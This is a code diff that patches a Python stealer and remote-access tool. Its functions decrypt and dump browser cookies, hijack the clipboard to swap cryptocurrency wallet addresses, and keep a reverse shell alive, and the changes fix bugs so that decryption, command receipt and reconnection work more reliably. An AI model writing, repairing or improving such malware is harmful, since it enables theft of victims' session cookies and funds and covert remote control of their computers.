@@ -166,11 +166,14 @@ def decrypt(buff, key):
     try:
         if buff.startswith(b'v10') or buff.startswith(b'v11'):
             iv, payload = buff[3:15], buff[15:]
-            return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode("utf-8", errors="ignore")
+            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+            return cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
         else:
+            # Fallback for older DPAPI encryption
             return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
-    except:
-        return "FAILED"
+    except Exception as e:
+        return f"[FAILED: {str(e)}]"
+
 
 def steal_browser():
     for name, path in BROWSERS.items():
@@ -225,8 +228,10 @@ def steal_browser():
                         for host, name_, enc_val in cursor.fetchall():
                             decrypted = decrypt(enc_val, key)
                             f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
+                    conn.commit()
                     conn.close()
                     os.remove("tmp_cookie.db")
+
                 except Exception as e:
                     log_path = os.path.join(EXTRACT_FOLDER, "cookie_error.log")
                     with open(log_path, "a", encoding="utf-8") as log:
@@ -325,7 +330,7 @@ def clipper():
         win32clipboard.CloseClipboard()
 
         for coin, pattern in CLIP_PATTERNS.items():
-            match = re.search(pattern, data.strip())  # ← FIXED: search instead of fullmatch
+            match = re.search(pattern, data)  # ← FIXED: search instead of fullmatch
             if match:
                 win32clipboard.OpenClipboard()
                 win32clipboard.EmptyClipboard()
@@ -526,6 +531,13 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
             while True:
                 try:
                     cmd = s.recv(1024).decode("utf-8").strip()
+                except (socket.timeout, UnicodeDecodeError):
+                    continue
+                except Exception as e:
+                    try:
+                        s.send(f"[!] recv error: {e}".encode())
+                    except: pass
+                    break
                 except socket.timeout:
                     continue  # Just try again
 
@@ -650,8 +662,10 @@ def keep_reverse_shell_alive():
         try:
             reverse_shell()
         except Exception as e:
-            pass
-        time.sleep(30)
+            with open(os.path.join(EXTRACT_FOLDER, "reverse_shell_error.txt"), "a", encoding="utf-8", errors="ignore") as log:
+                log.write(f"shell error: {e}\n")
+        time.sleep(15)
+
 
 
 def run():
